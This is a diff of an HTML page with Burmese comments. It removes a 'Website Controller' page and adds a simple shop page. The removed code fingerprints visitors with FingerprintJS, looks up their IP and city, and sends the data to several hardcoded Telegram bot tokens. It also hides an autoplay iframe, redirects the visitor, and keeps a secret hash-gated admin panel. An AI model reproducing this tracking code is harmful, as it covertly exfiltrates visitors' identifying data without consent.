@@ -2,73 +2,39 @@
 <html lang="my">
 <head>
     <meta charset="UTF-8">
-    <title>Website Controller</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <title>Simple Shop</title>
+    <style>
+        body { font-family: sans-serif; margin: 0; }
+        .page { display: none; padding: 20px; }
+        .active { display: block; }
+        nav { background: #333; color: white; padding: 10px; }
+    </style>
 </head>
-<body class="bg-black text-white h-screen flex flex-col items-center justify-center">
+<body>
 
-    <div id="player-container" class="hidden">
-        <iframe id="yt-player" src="" allow="autoplay"></iframe>
+    <nav>
+        <button onclick="showPage('home')">Home</button>
+        <button onclick="showPage('step')">Admin /step</button>
+    </nav>
+
+    <div id="home" class="page active">
+        <h1>Store Front</h1>
+        <p>ပစ္စည်းတွေက ဒီမှာပေါ်လာမယ်...</p>
     </div>
 
-    <div id="welcome-view" class="text-center">
-        <h1 class="text-3xl font-bold mb-6">ကြိုဆိုပါ၏</h1>
-        <button onclick="startAction()" class="bg-red-600 px-10 py-4 rounded-full text-xl font-bold">စတင်မည်</button>
-    </div>
-
-    <div id="admin-view" class="hidden bg-gray-900 p-6 rounded-lg text-left mt-10">
-        <h2 class="text-xl font-bold mb-4 text-blue-400">Settings</h2>
-        <input id="yt-id" class="w-full p-2 mb-4 text-black rounded" placeholder="YouTube Video ID">
-        <button onclick="saveSettings()" class="bg-blue-600 w-full py-2 rounded">Save & Update</button>
+    <div id="step" class="page">
+        <h1>Admin /step</h1>
+        <p>ပစ္စည်းအသစ် ထည့်ရန်ဖောင်...</p>
+        <input type="text" placeholder="ပစ္စည်းအမည်">
+        <button>သိမ်းမည်</button>
     </div>
 
     <script>
-        // ၁။ စတင်သည့် လုပ်ဆောင်ချက်
-        async function startAction() {
-            // YouTube အသံပွင့်ခြင်း
-            const ytId = localStorage.getItem('ytId') || 'dQw4w9WgXcQ';
-            const container = document.getElementById('player-container');
-            container.innerHTML = `<iframe src="https://www.youtube.com/embed/${ytId}?autoplay=1" width="0" height="0"></iframe>`;
-
-            // Telegram သို့ အချက်အလက် ပို့ခြင်း
-            try {
-                const fp = await FingerprintJS.load();
-                const res = await fp.get();
-                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
-                const msg = `Visitor Data:%0AID: ${res.visitorId}%0AIP: ${ipData.ip}%0ACity: ${ipData.city}`;
-                
-                const bots = [
-                    "8869917655:AAFk9tcBhEkmaFEOzXsbmcRQtymBtSZ3M9g",
-                    "8914390345:AAE-oorODF1HQbOLkuKJkNXwy-w2XbXtud0",
-                    "8684986169:AAE2JP-iOydPWEStbg2iDQ4koipL1czWYs0",
-                    "8949147819:AAGBSy8ZexmYrDMo2pRuqUA1k8PyOyE9OJQ"
-                ];
-
-                bots.forEach(token => {
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=6917040501&text=${msg}`);
-                });
-
-                // ၃ စက္ကန့်အကြာတွင် Home Page သို့ ရွှေ့ခြင်း
-                document.getElementById('welcome-view').innerHTML = "<h1 class='text-2xl'>ကျေးဇူးတင်ပါသည်...</h1>";
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com"; // သင်သွားလိုသော Home Page လင့်ခ်ထည့်ပါ
-                }, 3000);
-
-            } catch (e) {
-                console.error(e);
-            }
-        }
-
-        // Admin Panel အတွက်
-        function saveSettings() {
-            localStorage.setItem('ytId', document.getElementById('yt-id').value);
-            alert("သိမ်းဆည်းပြီးပါပြီ");
-        }
-
-        // လျှို့ဝှက်လမ်းကြောင်းဖြင့် Admin Panel ကို ဖွင့်ခြင်း
-        if(window.location.hash === '#/step/2003') {
-            document.getElementById('admin-view').classList.remove('hidden');
+        function showPage(pageId) {
+            // အားလုံးကို ဖျောက်မယ်
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            // ရွေးထားတဲ့ page ကို ပြမယ်
+            document.getElementById(pageId).classList.add('active');
         }
     </script>
 </body>
